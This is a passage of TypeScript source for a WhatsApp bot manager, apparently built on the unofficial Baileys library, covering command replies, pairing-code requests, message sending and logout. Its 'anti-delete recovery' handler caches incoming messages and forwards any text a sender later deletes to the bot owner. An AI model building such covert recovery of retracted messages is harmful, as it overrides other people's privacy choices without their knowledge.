                await sock.sendMessage(remoteJid, { text: finalText }, { quoted: msg });
              }
              this.addNotification({
                type: 'command',
                title: `⚡ Command Executed: .${command}`,
                body: `Executed for +${senderNum}. Response sent to WhatsApp chat.`,
                sender: `+${senderNum}`,
              });
            } catch (err: any) {
              console.error('Error replying to WhatsApp command:', err);
            }
          }
        }
      }
    });

    // Anti-Delete Recovery Handler
    sock.ev.on('messages.update', async (updates) => {
      for (const update of updates) {
        if (update.update?.message === null && update.key?.id) {
          const cached = this.messageCache.get(update.key.id);
          if (cached) {
            const alertBody = `🚨 *[SOLVATECH ANTI-DELETE RECOVERY]*\n\n👤 Sender: +${cached.sender}\n📍 Location: ${cached.isGroup ? 'Group Chat' : 'Direct Message'}\n💬 Deleted Text: "${cached.text}"\n⏰ Time: ${new Date(cached.timestamp).toLocaleTimeString()}`;

            this.addNotification({
              type: 'system',
              title: '🛡️ Deleted Message Recovered!',
              body: `From +${cached.sender}: "${cached.text}"`,
              sender: `+${cached.sender}`,
            });

            if (sock && this.currentStatus.user?.id) {
              try {
                await sock.sendMessage(this.currentStatus.user.id, { text: alertBody });
              } catch (e) {
                console.error('Error sending anti-delete alert to owner:', e);
              }
            }
          }
        }
      }
    });

    return sock;
  }

  public async requestPairingCode(rawPhoneNumber: string): Promise<string> {
    const cleanPhone = rawPhoneNumber.replace(/\D/g, '');
    if (!cleanPhone || cleanPhone.length < 8) {
      throw new Error('Please provide a valid phone number with country code (e.g., 2348012345678)');
    }

    this.currentStatus.targetPhone = `+${cleanPhone}`;
    this.currentStatus.state = 'awaiting_pairing';

    if (this.sock && this.currentStatus.isConnected) {
      return 'ALREADY_PAIRED';
    }

    let lastError: any;
    for (let attempt = 1; attempt <= 2; attempt++) {
      try {
        return await this.executePairingCodeRequest(cleanPhone);
      } catch (err: any) {
        lastError = err;
        console.warn(`Pairing code attempt ${attempt} failed: ${err.message}`);
        if (attempt < 2) {
          // Teardown and pause before retry
          try {
            if (this.sock) {
              this.sock.end(undefined);
              this.sock = null;
            }
          } catch {
            // Ignore
          }
          await new Promise((r) => setTimeout(r, 1500));
        }
      }
    }

    this.currentStatus.state = 'disconnected';
    this.currentStatus.lastError = lastError?.message || 'Failed to request WhatsApp pairing code.';
    this.addNotification({
      type: 'error',
      title: 'Pairing Attempt Failed',
      body: lastError?.message || 'Failed to request WhatsApp pairing code.',
    });
    throw lastError;
  }

  private async executePairingCodeRequest(cleanPhone: string): Promise<string> {
    // Clean up any stale unlinked socket safely
    if (this.sock) {
      try {
        this.sock.end(undefined);
      } catch {
        // Ignore
      }
      this.sock = null;
      await new Promise((r) => setTimeout(r, 500));
    }

    // Always reset auth directory when pairing a new/unlinked session
    if (!this.currentStatus.isConnected) {
      try {
        if (fs.existsSync(this.authDir)) {
          fs.rmSync(this.authDir, { recursive: true, force: true });
        }
      } catch (e) {
        console.error('Error clearing stale auth dir:', e);
      }
    }

    // Re-initialize fresh socket
    const sock = await this.initSocket();

    // Wait for socket to be ready to accept pairing code (QR or open signal or readiness)
    const code = await new Promise<string>((resolve, reject) => {
      let isDone = false;

      const finish = (result: string) => {
        if (!isDone) {
          isDone = true;
          clearTimeout(timeout);
          resolve(result);
        }
      };

      const fail = (err: any) => {
        if (!isDone) {
          isDone = true;
          clearTimeout(timeout);
          reject(err);
        }
      };

      const timeout = setTimeout(async () => {
        if (!isDone) {
          try {
            const rawCode = await sock.requestPairingCode(cleanPhone);
            finish(rawCode);
          } catch {
            fail(new Error('Timeout waiting for WhatsApp server handshake. Please try again.'));
          }
        }
      }, 20000);

      const handleUpdate = async (update: any) => {
        if (update.qr && !isDone) {
          try {
            const rawCode = await sock.requestPairingCode(cleanPhone);
            finish(rawCode);
          } catch (err) {
            fail(err);
          }
        } else if (update.connection === 'open' && !isDone) {
          finish('ALREADY_PAIRED');
        } else if (update.connection === 'close' && !isDone) {
          const reason = (update.lastDisconnect?.error as any)?.data?.reason;
          if (reason !== 'restart') {
            fail(update.lastDisconnect?.error || new Error('Connection closed by WhatsApp'));
          }
        }
      };

      sock.ev.on('connection.update', handleUpdate);

      // Also trigger requestPairingCode after 2 seconds in case connection is open without QR
      setTimeout(async () => {
        if (!isDone) {
          try {
            const rawCode = await sock.requestPairingCode(cleanPhone);
            finish(rawCode);
          } catch {
            // Socket still establishing connection, will be handled by handleUpdate or timeout
          }
        }
      }, 2000);
    });

    const formattedCode = code === 'ALREADY_PAIRED'
      ? code
      : code?.match(/.{1,4}/g)?.join('-') || code;

    this.currentStatus.pairingCode = formattedCode;
    this.currentStatus.pairingStage = 'code_generated';
    this.currentStatus.state = 'awaiting_pairing';

    this.addNotification({
      type: 'pairing',
      title: 'Pairing Code Generated',
      body: `Pairing Code: ${formattedCode} generated for +${cleanPhone}. Link in WhatsApp > Linked Devices > Link with phone number.`,
    });

    if (this.pairingCodeTimer) clearTimeout(this.pairingCodeTimer);
    this.pairingCodeTimer = setTimeout(() => {
      if (this.currentStatus.pairingCode === formattedCode) {
        this.currentStatus.pairingCode = undefined;
        this.addNotification({
          type: 'system',
          title: 'Pairing Code Expired',
          body: 'The 2-minute pairing code expired. You can request a fresh code anytime.',
        });
      }
    }, 120000);

    return formattedCode;
  }

  public async sendMessage(toPhone: string, text: string): Promise<boolean> {
    if (!this.sock || !this.currentStatus.isConnected) {
      throw new Error('WhatsApp is not currently connected. Please pair your number first.');
    }

    const cleanTo = toPhone.replace(/\D/g, '');
    const jid = `${cleanTo}@s.whatsapp.net`;

    await this.sock.sendMessage(jid, { text });

    this.addNotification({
      type: 'message_sent',
      title: `Message Sent to +${cleanTo}`,
      body: text,
      sender: `+${cleanTo}`,
    });

    return true;
  }

  public async logout(): Promise<void> {
    try {
      if (this.sock) {
        await this.sock.logout();
        this.sock.end(undefined);
        this.sock = null;
      }
    } catch {
      // Ignore
    }

    try {
      if (fs.existsSync(this.authDir)) {
        fs.rmSync(this.authDir, { recursive: true, force: true });
      }
    } catch (e) {
      console.error('Error clearing auth dir:', e);
    }

    this.connectedAt = null;
    this.currentStatus = {
      state: 'disconnected',
      isConnected: false,
      pairingStage: 'idle',
      user: undefined,
      pairingCode: undefined,
      qrCodeUrl: undefined,
      targetPhone: undefined,
      connectedAt: undefined,
    };

    this.addNotification({
      type: 'system',
      title: 'WhatsApp Session Cleared',
      body: 'All Baileys session credentials have been wiped. Ready to pair a new device.',
    });
  }
}

export const whatsappManager = new WhatsAppManager();
